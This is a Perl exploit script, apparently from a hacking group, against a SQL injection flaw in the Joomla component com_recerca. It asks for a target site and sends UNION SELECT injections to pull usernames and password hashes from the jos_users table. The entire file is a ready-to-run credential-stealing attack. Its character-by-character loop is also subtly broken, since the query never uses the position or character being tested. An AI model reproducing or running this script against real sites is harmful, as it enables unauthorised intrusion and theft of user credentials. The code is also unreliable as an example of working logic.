#!/usr/bin/perl

#=========================== [ root@indonesiancoder.com $ ~] ===========================#
# [~] Joomla Components com_recerca (ansubdepartments_id) SQL Injection Vulneralbility	#
# [~] Author	: Don Tukulesto								#
# [~] Homepage	: http://www.indonesiancoder.com                                	#
# [~] Tune in	: http://www.AntiSecradio.fm ( choose your weapon )			#
# [~] Gracias	: IndonesianCoder.com - AntiSecurity.org - ServerIsDown.org - MainHack	#
# [~] kaMtiEz, M3NW5, arianom, Jack-, Yadoy666, Gonzhack, SoulNet, s4va, tiw0L, Kill-9  #
# [~] SAINT, CYB3R_TR0N, M364TR0N, NoGe, TUCKER, Ian Petrucii, RoNz, Chercut, YOU !!	#
#=========================== [ root@indonesiancoder.com $ ~] ===========================#


use HTTP::Request;
use LWP::UserAgent;

$cmsapp = 'Joomla Component com_recerca';
$vuln   = 'index.php?option=com_recerca&task=linia&ansubdepartments_id=';
$column = 'concat(username,0x3a,password)tukulesto';
$table  = 'jos_users';
$regexp = 'No elements defined';
$maxlen = 65;

my $OS = "$^O";
if ($OS eq 'MSWin32') { system("cls"); } else { system("clear"); }

printf "\n
                $cmsapp
 [x]====================================================[x]
  |           www[dot]IndonesianCoder[dot]com            |
 [x]====================================================[x]

\n";

print " [~] URL Path : "; chomp($web=<STDIN>);
print " [~] Valid ID : "; chomp($id=<STDIN>);
print " [~] Column   : "; chomp($columns=<STDIN>);

if ($web =~ /http:\/\// ) { $target = $web."/"; } else { $target = "http://".$web."/"; }

print "\n\n [!] Exploiting $target ...\n\n";
&get_data;
print "\n\n [!] Exploit completed.\n\n";

sub get_data() {
	@columns = split(/,/, $columns);
	foreach $column (@columns) {
		print " [exploiting\@$web] SELECT $column FROM $table please wait...\n";
		syswrite(STDOUT, " [exploiting\@$web] $column\@$table > ", 255);
		for (my $i=1; $i<=$maxlen; $i++) {
			my $chr = 0;
			my $found = 1;
			my $char = 48;
			while (!$chr && $char<=90) {
				if(exploit($i,$char) !~ /$regexp/) {
					$chr = 1;
					$found = 1;
					syswrite(STDOUT,chr($char),1);
				} else { $found = 0; }
				$char++;
			}
			if(!$chr) {
				$char = 97;
				while(!$chr && $char<=122) {
					if(exploit($i,$char) !~ /$regexp/) {
						$chr = 1;
						$found = 1;
						syswrite(STDOUT,chr($char),1);
					} else { $found = 0; }
					$char++;
				}
			}
			if (!$found) {
				print "\n"; last;
			}
		}
	}
}

sub exploit() {
	my $limit = $_[0];
	my $chars = $_[1];
	my $shits = '+union+select+1,2,3,'.$column.',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+'.$table.'--';
	my $inject = $target.$vuln.$id.$shits;
	my $content = get_content($inject);
	return $content;
}

sub get_content() {
	my $url = $_[0];
	my $req = HTTP::Request->new(GET => $url);
	my $ua  = LWP::UserAgent->new();
	$ua->timeout(15);
	my $res = $ua->request($req);
	if ($res->is_error){
		print "\n\n [!] Error, ".$res->status_line.".\n\n";
		exit;
	}
	return $res->content;
}